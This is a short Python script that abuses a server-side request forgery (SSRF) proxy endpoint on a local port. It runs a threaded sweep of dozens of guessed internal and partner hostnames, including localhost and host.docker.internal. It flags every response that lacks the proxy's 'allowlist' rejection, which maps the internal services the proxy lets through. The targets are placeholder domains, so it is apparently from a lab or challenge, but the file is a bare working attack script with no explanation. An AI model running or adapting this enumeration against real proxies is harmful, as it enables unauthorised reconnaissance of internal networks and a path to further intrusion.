import requests, concurrent.futures as cf
P="http://127.0.0.1:24606/api/proxy"
hosts=[]
for n in ["rates","settlement","settlements","ledger","ledgers","fx","feed","feeds","data","api","partner","partners","ops","admin","gateway","relay","core","vault","vaultlink","internal","staging","prod","console","metrics","status","ws","stream","push","rates-api","settlement-api","ledger-api","partner-forex","www"]:
    hosts.append(f"{n}.partner-forex.example.com")
hosts += ["partner-forex.example.com","partner.example.com","rates.partner.example.com","vaultlink.internal","relay.internal","core.internal","ledger.internal","127.0.0.1","localhost","host.docker.internal"]
def probe(h):
    try:
        r=requests.get(P, params={"url":f"http://{h}/"}, timeout=4)
        if "allowlist" not in r.text:
            return (h, r.status_code, r.text[:60].replace("\n"," "))
    except Exception: pass
with cf.ThreadPoolExecutor(max_workers=16) as ex:
    for o in ex.map(probe, hosts):
        if o: print(o)
